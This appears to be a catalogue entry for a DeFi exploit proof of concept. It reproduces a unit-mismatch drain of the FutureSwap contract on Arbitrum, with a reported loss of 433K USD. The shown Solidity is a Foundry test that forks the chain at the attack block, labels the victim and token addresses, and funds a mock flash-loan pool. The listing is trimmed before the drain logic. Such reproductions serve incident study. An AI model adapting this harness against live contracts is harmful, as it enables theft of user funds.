# [?] FutureSwap - Unit Mismatch

## Summary
Severity: Unknown
Chain: Arbitrum
Component: futureswap
Published: 2026-01-10
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-01/futureswap_exp.sol
Type: defi-exploit-poc

## Details
Lost: 433K USD

```solidity
contract ContractTest is Test {
    uint256 internal constant ATTACK_BLOCK = 419_829_771;
    uint256 internal constant FORK_BLOCK = ATTACK_BLOCK - 1;
    uint256 internal constant ATTACK_TIMESTAMP = 1_768_033_835;

    address internal constant VICTIM_PROXY = 0xF7CA7384cc6619866749955065f17beDD3ED80bC;

    address internal constant USDCe = 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8;
    address internal constant WETH = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
    address internal constant AAVE_USDC_ATOKEN = 0x625E7708f30cA75bfd92586e17077590C60eb4cD;

	function setUp() public {
        vm.createSelectFork("arbitrum", FORK_BLOCK);
        vm.roll(ATTACK_BLOCK);
        vm.warp(ATTACK_TIMESTAMP);

        vm.label(VICTIM_PROXY, "VictimProxy");
        vm.label(USDCe, "USDCe");
        vm.label(WETH, "WETH");
        vm.label(AAVE_USDC_ATOKEN, "Aave_aUSDC");
    
	}

	function testFutureSwapDrain() public {
        address attackerEOA = address(0x00000000000000000000000000000000BEeFbEef);
        vm.label(attackerEOA, "AttackerEOA");
        vm.deal(attackerEOA, 1 ether);

        // Foundry EVM does not always execute L2-deployed Aave pools reliably across all environments.
        // This harness reproduces the flashloan *shape* (loan -> callback -> pull repayment) without depending on Aave internals.
        MockAaveV3Pool mockAave = new MockAaveV3Pool();
        vm.label(address(mockAave), "MockAaveV3Pool");
        vm.startPrank(AAVE_USDC_ATOKEN);
        IERC20(USDCe).transfer(address(mockAave), 500_250e6);
        vm.stopPrank();
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-01/futureswap_exp.sol_
